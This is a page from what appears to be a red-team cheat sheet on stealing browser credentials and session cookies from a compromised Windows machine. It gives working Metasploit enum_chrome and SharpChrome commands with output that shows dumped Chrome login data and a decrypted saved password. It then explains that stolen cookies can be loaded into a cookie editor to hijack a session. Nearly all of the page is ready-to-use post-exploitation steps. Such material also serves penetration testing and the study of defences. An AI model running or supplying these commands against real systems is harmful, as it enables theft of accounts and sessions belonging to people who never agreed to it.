---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/credential-access/steal-web-session-cookie
---

# Steal Web Session Cookie

## Metasploit

```ruby
msf6 > use post/windows/gather/enum_chrome
msf6 post(windows/gather/enum_chrome) > run session=-1 verbose=true

[*] Impersonating token: 6744
[*] Running as user 'VULNABLEONE\khan.chanthou'...
[*] Extracting data for user 'khan.chanthou'...
[+] Downloaded Web Data to '/home/kali/.msf4/loot/20240326134856_default_192.168.19.132_chrome.raw.WebD_628589.txt'
[-] Cookies not found
[+] Downloaded History to '/home/kali/.msf4/loot/20240326134858_default_192.168.19.132_chrome.raw.Histo_634997.txt'
[+] Downloaded Login Data to '/home/kali/.msf4/loot/20240326134900_default_192.168.19.132_chrome.raw.Login_164650.txt'
[-] Bookmarks not found
[+] Downloaded Preferences to '/home/kali/.msf4/loot/20240326134902_default_192.168.19.132_chrome.raw.Prefe_222905.txt'
[*] Found password encrypted with masterkey
[+] Found masterkey!
[+] Decrypted data: url:https://facebook.com/ laughing:P@$$w0rd123!
[*] Extensions installed: 
[*] => Web Store
[*] => Google Docs Offline
[*] => Chrome PDF Viewer
[*] => Google Network Speech
[*] => Google Hangouts
[*] => Chrome Web Store Payments
[+] Decrypted data saved in: /home/kali/.msf4/loot/20240326134905_default_192.168.19.132_chrome.decrypted_174474.txt
[*] Post module execution completed
```

## SharpChrome

{% code overflow="wrap" %}
```powershell
C:\> SharpChrome.exe logins

---  Credential (Path: C:\Users\khan.chanthou\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\khan.chanthou\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://facebook.com/,https://facebook.com/,4/4/2024 3:39:01 PM,13356693541443660,laughing,P@$$w0rd123!


C:\> SharpChrome.exe cookies /format:json /url:domain.com
C:\> SharpChrome.exe cookies /format:json /showall
```
{% endcode %}

If we compromised cookies data, we can import in cookie editor and refreshing the page

<figure><img src="../../../../.gitbook/assets/image (916).png" alt=""><figcaption></figcaption></figure>
